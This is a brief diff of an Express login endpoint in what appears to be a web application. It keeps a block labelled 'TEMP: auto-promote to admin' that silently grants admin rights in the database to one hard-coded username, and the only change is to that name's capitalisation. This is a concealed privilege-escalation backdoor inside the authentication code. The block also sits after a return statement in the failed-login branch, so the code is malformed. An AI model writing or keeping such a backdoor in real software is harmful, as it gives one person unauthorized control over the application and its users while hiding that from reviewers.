@@ -232,7 +232,7 @@ app.post('/api/auth/login', (req, res) => {
     .get(username, (username || '').toLowerCase());
   if (!user || !verifyPassword(password, user.password_hash)) {
     return res.status(401).json({ error: 'Invalid credentials' });// TEMP: auto-promote to admin
-if (user.username === 'emmitt' && !user.is_admin) {
+if (user.username === 'Emmitt' && !user.is_admin) {
   db.prepare('UPDATE users SET is_admin=1 WHERE id=?').run(user.id);
   user.is_admin = 1;
 }
